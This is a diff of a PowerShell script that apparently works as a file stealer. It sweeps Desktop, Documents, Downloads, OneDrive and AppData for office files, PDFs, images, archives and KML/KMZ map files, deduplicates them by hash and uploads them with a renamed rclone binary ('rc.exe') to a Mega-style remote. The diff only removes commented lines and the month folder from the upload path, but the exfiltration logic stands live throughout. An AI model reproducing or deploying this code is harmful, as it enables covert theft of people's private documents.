@@ -18,11 +18,9 @@ function SearchAndCopy ($LocalPath, $Second) {
         $hash = (Get-FileHash -Algorithm MD5 $file).hash 
         if ((Select-String -path $hashfile -Pattern $hash) -eq $null) {
             $file.FullName | Out-File -Encoding utf8 -FilePath $logfile -Append
-            #$sendDestDir = $destDir + $objName + '_' + $CurrDateTime; New-Item $sendDestDir -ItemType Directory -ea 0
             if (Test-Path -Path (Join-Path $allDestDir $file.Name)) {
                 Copy-Item $file.FullName -Destination ($allDestDir + '\' + $file.BaseName + "_$num" + $file.Extension) -Recurse -Container
                 if ($Second) {
-                    #$sendDestDir = $destDir + $objName + '_' + $CurrDateTime; New-Item $sendDestDir -ItemType Directory -ea 0 
                     Copy-Item $file.FullName -Destination ($sendDestDir + '\' + $file.BaseName + "_$num" + $file.Extension) -Recurse -Container 
                 }
                 $num+=1
@@ -77,7 +75,6 @@ $logfile = ($destDir + 'logs.txt'); New-Item $logfile -ItemType File -ea 0
 
 $currDateTime = (Get-Date -UFormat %d.%m.%y..%H.%M)
 $currDate = (Get-Date -UFormat %d.%m.%y)
-$CurrMonth = (Get-Date -UFormat %B)
 $currYear = (Get-Date -UFormat %Y)
 $size = 100*1024*1024
 $exts = ('*.doc','*.docx','*.rtf','*.xls','*.xlsm','*.xlsx','*.pdf','*.txt','*.zip','*.rar','*.7z','*.jpg','*.kme','*.kml','*.kmz','*.jpeg','*.png','*.bmp','*.ppt','*.pptx','*.odt','*.csv')
@@ -119,9 +116,7 @@ $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive', 'AppData')
         $newhash = (Get-FileHash -Algorithm MD5 $hashfile).hash
         if ($newhash -ne $etalonhash) {
             echo "Upload Documents . . ."
-            &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') copy -M -P $sendDestDir mgp:/$destMega/$currYear/$currMonth/$currDate/$objName/
+            &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') copy -M -P $sendDestDir mgp:/$destMega/$currYear/$currDate/$objName/
         }
     }
-
-    
 }
